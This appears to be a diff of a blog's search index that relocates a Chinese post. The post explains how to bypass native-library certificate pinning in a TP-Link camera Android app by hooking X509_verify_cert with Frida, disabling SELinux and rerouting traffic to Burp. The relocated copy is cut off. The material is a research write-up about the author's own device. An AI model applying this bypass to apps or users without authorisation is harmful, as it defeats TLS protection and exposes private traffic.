@@ -533,92 +533,6 @@
       </tags>
   </entry>
   <entry>
-    <title>利用Frida手动绕过Android-APP证书校验</title>
-    <url>/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/</url>
-    <content><![CDATA[<p>HTTPS证书校验绕过有很多成熟的方法，比如SSL Unpinning，JustTrustMe等，但是遇到混淆过或写在so里的校验的时候是无效的。</p>
-<p>本文写的可能会有些啰嗦，记录了我整个尝试的思路。没有直接写绕过方法，是想给其他和我一样的萌新提供一些思路，如有不妥之处大佬们轻喷。</p>
-<span id="more"></span>
-
-<p>最近买了一个TP-Link的摄像头，顺便下载的它配套的安卓应用，想看看这个应用在与服务器交互的时候都发了些啥，因此准备抓包。当我把姿势都摆好了之后，却发现它的流量在<code>Burpsuite</code>里完全没出现。</p>
-<p>好的吧，我知道可能你是校验了证书。</p>
-<p>掏出祖传的<code>XPosed</code>插件<code>SSL Unpinning</code>，竟然没用。emmmm，那可能是进行了混淆，XPosed在Hook的时候需要特定的包名，如果包名被混淆了自然是Hook不到的嘛。</p>
-<h2 id="代理流量"><a href="#代理流量" class="headerlink" title="代理流量"></a>代理流量</h2><p>在系统里配置了代理却抓不到包，很有可能是因为APP有限制，禁止流量走代理。因为我是在模拟器上安装了这个APP，因此想到了强行代理这个模拟器的流量，看看会怎样。</p>
-<p>测试中用的是<code>雷电模拟器</code>，流量转发用的是<code>Proxifier</code>。因此在<code>Proxifier</code>中配置需要拦截流量的进程名为<code>LdBoxHeadless.exe</code>的进程，来强行转发流量到我们的Burp上：</p>
-<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200409202521746.png" alt="image-20200409202521746"></p>
-<p>转发成功，现在尝试一下请求，比如找回密码功能，点击“完成”后，返回的提示竟然是“网络连接失败”？？？</p>
-<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200409202728285.png" alt="image-20200409202728285"></p>
-<p>同时，Burp收到警告，提示<code>Failed to negotiate a TLS connect to xxx</code>，表示HTTPS握手过程失败。</p>
-<p>好吧，果然是限制了流量同时也校验了证书。</p>
-<h2 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h2><p>既然发生了错误，那应该会有相应的报错日志，看看能不能从日志里看出点端倪。</p>
-<p>进入<code>adb shell</code>，先输入<code>ps</code>命令查看对应进程的pid，比如这里是 <code>2035</code> ，在用<code>logcat | grep 2035</code>来过滤出该进程的日志即可。</p>
-<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200410143906742.png" alt="image-20200410143906742"></p>
-<p>此时再点击完成按钮，提示“网络连接失败”，查看logcat打出来的日志，发现了证书错误的信息：</p>
-<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200410144046644.png" alt="image-20200410144046644"></p>
-<h2 id="反编译dex"><a href="#反编译dex" class="headerlink" title="反编译dex"></a>反编译dex</h2><p>看到相关的报错日志，如果有反编译出来的伪代码，看看能不能搜到相关报错的日志的语句来定位到相关代码段，顺藤摸瓜找到校验的函数，再去Hook岂不美滋滋~</p>
-<p>先尝试一下反编译，来看看是不是被混淆过。解压<code>apk</code>，使用<code>dex2jar</code>将<code>classes.dex</code>转换成<code>.jar</code>格式，再用<code>Java Decompiler</code>查看。看到包名的时候，发现它确实进行了混淆。</p>
-<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200409201406531.png" alt="image-20200409201406531"></p>
-<p>但是并没有看到和常见的 HTTP 相关的组件（比如<code>OKHttp3</code>）相关的包。</p>
-<p>将报错日志的部分拆成关键词来搜索也完全搜不到相关的地方，非常让人怀疑实际上这部分逻辑就没写在Java层，很有可能在so里。</p>
-<h2 id="分析so"><a href="#分析so" class="headerlink" title="分析so"></a>分析so</h2><p>既然如此，进入apk包中的lib文件夹，看看它加载的so里有没有什么特别之处。从so文件的大小和名称中，第一眼就识别到了<code>libIPCAppContextJNI.so</code>文件。果断拖到ida中看看里面有什么。</p>
-<p>在ida中加载完之后，果断的打开Strings Window来暴搜字符串。输入<code>verify error:num</code>，看看我发现了什么！</p>
-<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200410144726512.png" alt="image-20200410144726512"></p>
-<p>跟进这个字符串的调用，F5，顺利找到打出这句日志的代码：</p>
-<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200410144929216.png" alt="image-20200410144929216"></p>
-<p>但是，这个函数是一个回调函数，函数名为<code>TPSSLManager::SSLCtxVerifyCallback</code>，追踪它的调用也没有找到有验证证书相关的操作，似乎又陷入僵局……</p>
-<p>因为对证书校验的实现不是很熟悉，打破僵局的方法只能求助于度娘。看到那句日志打印的上一行<code>X509_verify_cert_error_string</code>函数，抱着死马当活马医的心态，扔进搜索引擎，竟然搜到了一堆OPENSSL的证书校验的示例代码！</p>
-<p>通过示例代码的注释，发现OPENSSL校验证书的函数名为<code>X509_verify_cert</code>，回到ida里搜了一下，Bingo！</p>
-<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200410150004769.png" alt="image-20200410150004769"></p>
-<p>跟进这个函数被调用的地方看了下，和示例代码一样，都是在用<code>if</code>语句在判断这个函数的返回值是1还是0，那初步确认证书校验的点就在此处。</p>
-<h2 id="Frida-Hook"><a href="#Frida-Hook" class="headerlink" title="Frida Hook"></a>Frida Hook</h2><p>由于测试是在雷电模拟器里做的，因此需要下载并运行x86版本的<code>Frida-server</code>。给萌新的一个小提示：Frida运行需要关闭SELinux，可以在adb shell中输入<code>setenforce 0</code>来关闭它。</p>
-<h3 id="确认函数地址"><a href="#确认函数地址" class="headerlink" title="确认函数地址"></a>确认函数地址</h3><p>在写JS脚本之前，先使用Frida的命令行来确认一下要Hook的模块和函数是否可用（个人觉得这样便于调试）。在PC端的命令行输入<code>frida -U com.tplink.ipc</code>连接.</p>
-<p>进入后输入<code>Module.findExportByName(&quot;libIPCAppContextJNI.so&quot;, &quot;X509_verify_cert&quot;)</code>应该能打印出<code>X509_verify_cert</code>函数的入口地址，但是竟然返回的是<code>null</code>。此时有点慌了，难道我的判断出错了吗？</p>
-<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200410151702592.png" alt="image-20200410151702592"></p>
-<p>果断使用<code>Process.enumerateModules()</code>命令，会在命令行中打印出所有的模块（即加载的so），找了一下发现也没有<code>libIPCAppContextJNI.so</code>，甚至路径几乎都是<code>/system/lib</code>这样系统路径下的文件。</p>
-<p>在这里我卡了很久，搜了很多文章，都没有发现问题出在哪了，简直一度就要放弃了，直到我想要不要换真机试一下……简直峰回路转！全都成功了，顺利打印出地址：</p>
-<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200410151802418.png" alt="image-20200410151802418"></p>
-<h3 id="脚本编写-amp-Hook"><a href="#脚本编写-amp-Hook" class="headerlink" title="脚本编写 &amp; Hook"></a>脚本编写 &amp; Hook</h3><p>接下来就可以编写JS代码来进行Hook了，代码内容也很简单，就是修改这个函数的返回值，让它永远等于1即可：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> nativePointer = Module.findExportByName(<span class="string">&quot;libIPCAppContextJNI.so&quot;</span>, <span class="string">&quot;X509_verify_cert&quot;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;-------------Start-------------&quot;</span>);</span><br><span class="line">    Interceptor.attach(nativePointer, &#123;</span><br><span class="line">        onEnter: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>)</span>&#123;</span><br><span class="line">            <span class="comment">// 此处是修改入参要做的逻辑，在这里不需要修改，留空即可</span></span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave: <span class="function"><span class="keyword">function</span>(<span class="params">retval</span>)</span>&#123;</span><br><span class="line">	        <span class="built_in">console</span>.log(<span class="string">&quot;----------leaving-------------&quot;</span>)</span><br><span class="line">            <span class="comment">// 打印原始的返回值</span></span><br><span class="line">            <span class="built_in">console</span>.log(retval);</span><br><span class="line">            <span class="comment">// replace修改返回值</span></span><br><span class="line">	        retval.replace(<span class="number">0x1</span>)</span><br><span class="line">            <span class="comment">// 再次打印出来验证一下修改是否成功</span></span><br><span class="line">            <span class="built_in">console</span>.log(retval);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>把这个文件保存，我命名为<code>hook.js</code>。开启Frida，在忘记密码那里点几下：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">(frida) pentest@DESKTOP<span class="literal">-2AE07FJ</span>:~/frida<span class="variable">$</span> frida <span class="literal">-U</span> com.tplink.ipc <span class="literal">-l</span> hook.js</span><br><span class="line">     ____</span><br><span class="line">    / _  |   Frida <span class="number">12.8</span>.<span class="number">17</span> - A world<span class="literal">-class</span> dynamic instrumentation toolkit</span><br><span class="line">   | (_| |</span><br><span class="line">    &gt; _  |   Commands:</span><br><span class="line">   /_/ |_|       help      -&gt; Displays the help system</span><br><span class="line">   . . . .       object?   -&gt; Display information about <span class="string">&#x27;object&#x27;</span></span><br><span class="line">   . . . .       <span class="keyword">exit</span>/quit -&gt; <span class="keyword">Exit</span></span><br><span class="line">   . . . .</span><br><span class="line">   . . . .   More info at https://www.frida.re/docs/home/</span><br><span class="line">Attaching...</span><br><span class="line">------------<span class="literal">-Start</span>-------------</span><br><span class="line">[<span class="type">MI</span> <span class="number">5</span><span class="type">s</span>::<span class="type">com.tplink.ipc</span>]-&gt; ---------<span class="literal">-leaving</span>-------------</span><br><span class="line"><span class="number">0</span>x1</span><br><span class="line"><span class="number">0</span>x1</span><br></pre></td></tr></table></figure>
-
-<p>Nice！成功Hook到并打印了返回值。</p>
-<h2 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h2><p>到这一步，已经接近成功了，但是在系统里设置代理之后它并不会走，判断应该是做了代理上的限制，导致APP的流量不跟随代理。</p>
-<p>那这一步的目标，就是让APP的流量顺利走到PC的Burpsuite上，来帮助我们进行分析。</p>
-<p>第一种思路自然是找出限制代理的部分，一并Hook掉，但是我实在是不想再去找了，于是果断放弃；</p>
-<p>第二种思路是通过无线网卡共享一个热点，再配置转发达到抓包的目的。这种方法在Windows系统下配置很麻烦，放弃；</p>
-<p>第三种思路是PC端配置反向代理，手机端通过修改<code>hosts</code>文件强行转流量，因为之前的测试中配置过，且配置也简单（就是操作步骤有点复杂，好在环境都在），就果断用了。</p>
-<p>反向代理是要配置证书的，但是因为Hook掉了校验，所以配置什么证书也无所谓了~</p>
-<h3 id="配置Hosts"><a href="#配置Hosts" class="headerlink" title="配置Hosts"></a>配置Hosts</h3><p>配置hosts文件需要知道域名，在分析校验的部分看到了对于<code>*.tplinkcloud.com.cn</code>域名的校验。因此再次用Strings暴搜：</p>
-<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200410160228733.png" alt="image-20200410160228733"></p>
-<p>因为考虑到可能不同的功能会访问不同的域名，为了方便起见，一次性把这些域名都添加到<code>hosts</code>文件里。</p>
-<p>在修改<code>hosts</code>文件的时候，需要注意编写的格式。可以先通过<code>adb pull /etc/hosts</code>将原始的hosts文件下载到PC，再在这个基础上修改。在“回车”符号上一定要注意，Android只识别<code>\n</code>而无法识别<code>\r\n</code>，因此在编辑的时候一定要注意回车符。</p>
-<p>我使用的是<code>Notepad++</code>来进行编辑，注意右下角：</p>
-<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200410160643053.png" alt="image-20200410160643053"></p>
-<p>如果不是LF的话，可以双击这个位置选择“转换为Unix格式”即可。</p>
-<p>编辑完后再<code>adb push</code>回原位并重启即可生效。</p>
-<h3 id="开始抓包！"><a href="#开始抓包！" class="headerlink" title="开始抓包！"></a>开始抓包！</h3><p>终于在经过无数失败之后，可以开始抓包了。</p>
-<p>如果以上步骤都配置正确的话，此时打开APP，在PC上输入命令<code>frida -U com.tplink.ipc -l hook.js</code>后，点击相应的按钮，在命令行里会出现一串这样的输出：</p>
-<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200410161021863.png" alt="image-20200410161021863"></p>
-<p>每一个输出都代表一个请求的证书校验被绕过了。</p>
-<p>打开Burpsuite，终于能看到熟悉的请求了：</p>
-<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200410161204206.png" alt="image-20200410161204206"></p>
-<p>接下来就可以尽情的发挥脑洞开始测试了！</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>整个思路其实非常简单，主要是这个APP没有进行过加固，分析起来比较方便，so的函数名都很全，所以在分析这一步中并没有太大难度。总体思路总结如下：</p>
-<ol>
-<li>通过反编译等方式确定证书绑定的核心函数的位置</li>
-<li>使用Frida对该核心函数进行Hook</li>
-<li>如果遇到无法代理的情况，嫌麻烦可以用反向代理的方式抓包</li>
-</ol>
-]]></content>
-      <tags>
-        <tag>Burpsuite</tag>
-        <tag>Frida</tag>
-        <tag>工具配置</tag>
-        <tag>Android</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>使用Python搭建反向代理分析IoT设备流量</title>
     <url>/2020/04/16/%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%88%86%E6%9E%90IoT%E8%AE%BE%E5%A4%87%E6%B5%81%E9%87%8F/</url>
     <content><![CDATA[<p>反向代理的概念和应用早已不是什么稀奇玩意了。但是在测试过程中，对于那些无法配置代理，使用了HTTPS的设备，想要分析流量还是比较困难的。借助反向代理，则可以降低这一过程的难度，轻松获取到想要的数据。</p>
@@ -704,6 +618,92 @@
         <tag>MiTM</tag>
         <tag>DNS劫持</tag>
         <tag>HTTPS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>利用Frida手动绕过Android-APP证书校验</title>
+    <url>/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/</url>
+    <content><![CDATA[<p>HTTPS证书校验绕过有很多成熟的方法，比如SSL Unpinning，JustTrustMe等，但是遇到混淆过或写在so里的校验的时候是无效的。</p>
+<p>本文写的可能会有些啰嗦，记录了我整个尝试的思路。没有直接写绕过方法，是想给其他和我一样的萌新提供一些思路，如有不妥之处大佬们轻喷。</p>
+<span id="more"></span>
+
+<p>最近买了一个TP-Link的摄像头，顺便下载的它配套的安卓应用，想看看这个应用在与服务器交互的时候都发了些啥，因此准备抓包。当我把姿势都摆好了之后，却发现它的流量在<code>Burpsuite</code>里完全没出现。</p>
+<p>好的吧，我知道可能你是校验了证书。</p>
+<p>掏出祖传的<code>XPosed</code>插件<code>SSL Unpinning</code>，竟然没用。emmmm，那可能是进行了混淆，XPosed在Hook的时候需要特定的包名，如果包名被混淆了自然是Hook不到的嘛。</p>
+<h2 id="代理流量"><a href="#代理流量" class="headerlink" title="代理流量"></a>代理流量</h2><p>在系统里配置了代理却抓不到包，很有可能是因为APP有限制，禁止流量走代理。因为我是在模拟器上安装了这个APP，因此想到了强行代理这个模拟器的流量，看看会怎样。</p>
+<p>测试中用的是<code>雷电模拟器</code>，流量转发用的是<code>Proxifier</code>。因此在<code>Proxifier</code>中配置需要拦截流量的进程名为<code>LdBoxHeadless.exe</code>的进程，来强行转发流量到我们的Burp上：</p>
+<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200409202521746.png" alt="image-20200409202521746"></p>
+<p>转发成功，现在尝试一下请求，比如找回密码功能，点击“完成”后，返回的提示竟然是“网络连接失败”？？？</p>
+<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200409202728285.png" alt="image-20200409202728285"></p>
+<p>同时，Burp收到警告，提示<code>Failed to negotiate a TLS connect to xxx</code>，表示HTTPS握手过程失败。</p>
+<p>好吧，果然是限制了流量同时也校验了证书。</p>
+<h2 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h2><p>既然发生了错误，那应该会有相应的报错日志，看看能不能从日志里看出点端倪。</p>
+<p>进入<code>adb shell</code>，先输入<code>ps</code>命令查看对应进程的pid，比如这里是 <code>2035</code> ，在用<code>logcat | grep 2035</code>来过滤出该进程的日志即可。</p>
+<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200410143906742.png" alt="image-20200410143906742"></p>
+<p>此时再点击完成按钮，提示“网络连接失败”，查看logcat打出来的日志，发现了证书错误的信息：</p>
+<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200410144046644.png" alt="image-20200410144046644"></p>
+<h2 id="反编译dex"><a href="#反编译dex" class="headerlink" title="反编译dex"></a>反编译dex</h2><p>看到相关的报错日志，如果有反编译出来的伪代码，看看能不能搜到相关报错的日志的语句来定位到相关代码段，顺藤摸瓜找到校验的函数，再去Hook岂不美滋滋~</p>
+<p>先尝试一下反编译，来看看是不是被混淆过。解压<code>apk</code>，使用<code>dex2jar</code>将<code>classes.dex</code>转换成<code>.jar</code>格式，再用<code>Java Decompiler</code>查看。看到包名的时候，发现它确实进行了混淆。</p>
+<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200409201406531.png" alt="image-20200409201406531"></p>
+<p>但是并没有看到和常见的 HTTP 相关的组件（比如<code>OKHttp3</code>）相关的包。</p>
+<p>将报错日志的部分拆成关键词来搜索也完全搜不到相关的地方，非常让人怀疑实际上这部分逻辑就没写在Java层，很有可能在so里。</p>
+<h2 id="分析so"><a href="#分析so" class="headerlink" title="分析so"></a>分析so</h2><p>既然如此，进入apk包中的lib文件夹，看看它加载的so里有没有什么特别之处。从so文件的大小和名称中，第一眼就识别到了<code>libIPCAppContextJNI.so</code>文件。果断拖到ida中看看里面有什么。</p>
+<p>在ida中加载完之后，果断的打开Strings Window来暴搜字符串。输入<code>verify error:num</code>，看看我发现了什么！</p>
+<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200410144726512.png" alt="image-20200410144726512"></p>
+<p>跟进这个字符串的调用，F5，顺利找到打出这句日志的代码：</p>
+<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200410144929216.png" alt="image-20200410144929216"></p>
+<p>但是，这个函数是一个回调函数，函数名为<code>TPSSLManager::SSLCtxVerifyCallback</code>，追踪它的调用也没有找到有验证证书相关的操作，似乎又陷入僵局……</p>
+<p>因为对证书校验的实现不是很熟悉，打破僵局的方法只能求助于度娘。看到那句日志打印的上一行<code>X509_verify_cert_error_string</code>函数，抱着死马当活马医的心态，扔进搜索引擎，竟然搜到了一堆OPENSSL的证书校验的示例代码！</p>
+<p>通过示例代码的注释，发现OPENSSL校验证书的函数名为<code>X509_verify_cert</code>，回到ida里搜了一下，Bingo！</p>
+<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200410150004769.png" alt="image-20200410150004769"></p>
+<p>跟进这个函数被调用的地方看了下，和示例代码一样，都是在用<code>if</code>语句在判断这个函数的返回值是1还是0，那初步确认证书校验的点就在此处。</p>
+<h2 id="Frida-Hook"><a href="#Frida-Hook" class="headerlink" title="Frida Hook"></a>Frida Hook</h2><p>由于测试是在雷电模拟器里做的，因此需要下载并运行x86版本的<code>Frida-server</code>。给萌新的一个小提示：Frida运行需要关闭SELinux，可以在adb shell中输入<code>setenforce 0</code>来关闭它。</p>
+<h3 id="确认函数地址"><a href="#确认函数地址" class="headerlink" title="确认函数地址"></a>确认函数地址</h3><p>在写JS脚本之前，先使用Frida的命令行来确认一下要Hook的模块和函数是否可用（个人觉得这样便于调试）。在PC端的命令行输入<code>frida -U com.tplink.ipc</code>连接.</p>
+<p>进入后输入<code>Module.findExportByName(&quot;libIPCAppContextJNI.so&quot;, &quot;X509_verify_cert&quot;)</code>应该能打印出<code>X509_verify_cert</code>函数的入口地址，但是竟然返回的是<code>null</code>。此时有点慌了，难道我的判断出错了吗？</p>
+<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200410151702592.png" alt="image-20200410151702592"></p>
+<p>果断使用<code>Process.enumerateModules()</code>命令，会在命令行中打印出所有的模块（即加载的so），找了一下发现也没有<code>libIPCAppContextJNI.so</code>，甚至路径几乎都是<code>/system/lib</code>这样系统路径下的文件。</p>
+<p>在这里我卡了很久，搜了很多文章，都没有发现问题出在哪了，简直一度就要放弃了，直到我想要不要换真机试一下……简直峰回路转！全都成功了，顺利打印出地址：</p>
+<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200410151802418.png" alt="image-20200410151802418"></p>
+<h3 id="脚本编写-amp-Hook"><a href="#脚本编写-amp-Hook" class="headerlink" title="脚本编写 &amp; Hook"></a>脚本编写 &amp; Hook</h3><p>接下来就可以编写JS代码来进行Hook了，代码内容也很简单，就是修改这个函数的返回值，让它永远等于1即可：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> nativePointer = Module.findExportByName(<span class="string">&quot;libIPCAppContextJNI.so&quot;</span>, <span class="string">&quot;X509_verify_cert&quot;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;-------------Start-------------&quot;</span>);</span><br><span class="line">    Interceptor.attach(nativePointer, &#123;</span><br><span class="line">        onEnter: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>)</span>&#123;</span><br><span class="line">            <span class="comment">// 此处是修改入参要做的逻辑，在这里不需要修改，留空即可</span></span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave: <span class="function"><span class="keyword">function</span>(<span class="params">retval</span>)</span>&#123;</span><br><span class="line">	        <span class="built_in">console</span>.log(<span class="string">&quot;----------leaving-------------&quot;</span>)</span><br><span class="line">            <span class="comment">// 打印原始的返回值</span></span><br><span class="line">            <span class="built_in">console</span>.log(retval);</span><br><span class="line">            <span class="comment">// replace修改返回值</span></span><br><span class="line">	        retval.replace(<span class="number">0x1</span>)</span><br><span class="line">            <span class="comment">// 再次打印出来验证一下修改是否成功</span></span><br><span class="line">            <span class="built_in">console</span>.log(retval);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>把这个文件保存，我命名为<code>hook.js</code>。开启Frida，在忘记密码那里点几下：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">(frida) pentest@DESKTOP<span class="literal">-2AE07FJ</span>:~/frida<span class="variable">$</span> frida <span class="literal">-U</span> com.tplink.ipc <span class="literal">-l</span> hook.js</span><br><span class="line">     ____</span><br><span class="line">    / _  |   Frida <span class="number">12.8</span>.<span class="number">17</span> - A world<span class="literal">-class</span> dynamic instrumentation toolkit</span><br><span class="line">   | (_| |</span><br><span class="line">    &gt; _  |   Commands:</span><br><span class="line">   /_/ |_|       help      -&gt; Displays the help system</span><br><span class="line">   . . . .       object?   -&gt; Display information about <span class="string">&#x27;object&#x27;</span></span><br><span class="line">   . . . .       <span class="keyword">exit</span>/quit -&gt; <span class="keyword">Exit</span></span><br><span class="line">   . . . .</span><br><span class="line">   . . . .   More info at https://www.frida.re/docs/home/</span><br><span class="line">Attaching...</span><br><span class="line">------------<span class="literal">-Start</span>-------------</span><br><span class="line">[<span class="type">MI</span> <span class="number">5</span><span class="type">s</span>::<span class="type">com.tplink.ipc</span>]-&gt; ---------<span class="literal">-leaving</span>-------------</span><br><span class="line"><span class="number">0</span>x1</span><br><span class="line"><span class="number">0</span>x1</span><br></pre></td></tr></table></figure>
+
+<p>Nice！成功Hook到并打印了返回值。</p>
+<h2 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h2><p>到这一步，已经接近成功了，但是在系统里设置代理之后它并不会走，判断应该是做了代理上的限制，导致APP的流量不跟随代理。</p>
+<p>那这一步的目标，就是让APP的流量顺利走到PC的Burpsuite上，来帮助我们进行分析。</p>
+<p>第一种思路自然是找出限制代理的部分，一并Hook掉，但是我实在是不想再去找了，于是果断放弃；</p>
+<p>第二种思路是通过无线网卡共享一个热点，再配置转发达到抓包的目的。这种方法在Windows系统下配置很麻烦，放弃；</p>
+<p>第三种思路是PC端配置反向代理，手机端通过修改<code>hosts</code>文件强行转流量，因为之前的测试中配置过，且配置也简单（就是操作步骤有点复杂，好在环境都在），就果断用了。</p>
+<p>反向代理是要配置证书的，但是因为Hook掉了校验，所以配置什么证书也无所谓了~</p>
+<h3 id="配置Hosts"><a href="#配置Hosts" class="headerlink" title="配置Hosts"></a>配置Hosts</h3><p>配置hosts文件需要知道域名，在分析校验的部分看到了对于<code>*.tplinkcloud.com.cn</code>域名的校验。因此再次用Strings暴搜：</p>
+<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200410160228733.png" alt="image-20200410160228733"></p>
+<p>因为考虑到可能不同的功能会访问不同的域名，为了方便起见，一次性把这些域名都添加到<code>hosts</code>文件里。</p>
+<p>在修改<code>hosts</code>文件的时候，需要注意编写的格式。可以先通过<code>adb pull /etc/hosts</code>将原始的hosts文件下载到PC，再在这个基础上修改。在“回车”符号上一定要注意，Android只识别<code>\n</code>而无法识别<code>\r\n</code>，因此在编辑的时候一定要注意回车符。</p>
+<p>我使用的是<code>Notepad++</code>来进行编辑，注意右下角：</p>
+<p><img src="/2020/04/12/%E5%88%A9%E7%94%A8Frida%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87Android-APP%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/image-20200410160643053.png" alt="image-20200410160643053"></p>
+<p>如果不是LF的话，可以双击这个位置选择“转换为Unix格式”即可。</p>
+<p>编辑完后再<code>adb push</code>回原位并重启即可生效。</p>
